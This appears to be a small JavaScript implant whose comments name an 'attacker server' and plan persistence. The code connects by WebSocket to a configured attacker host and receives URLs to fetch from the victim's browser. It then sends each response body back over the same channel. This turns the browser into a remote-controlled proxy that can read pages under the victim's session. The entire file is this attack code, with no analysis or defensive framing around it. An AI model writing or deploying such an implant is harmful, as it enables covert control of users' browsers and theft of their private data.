(() => { // Don't pollute global namespace
    console.log('stuff')
    const config = require('../config')

    // TODO implement persistence

    (() => {
        console.log('loaded')

        // TODO build file using a config containing the attacker server
        const id = Math.floor(Math.random() * (2 ** 32))
        const ws_url = 'ws://' + config.url + ':' + config.port + config.wspath + '/' + id
        const ws = new WebSocket(ws_url)

        ws.onmessage = (msg) => {
            const msgobj = JSON.parse(msg.data)
            const url = msgobj.url
            // TODO make a request object to allow for more configurable requests
            fetch(url)
            .then(res => {
                res.text()
                .then(restext => {
                    ws.send(JSON.stringify(restext))
                })
                .catch(err => ws.send(err))
            })
            .catch(err => ws.send(err))
        }
    })()
})()
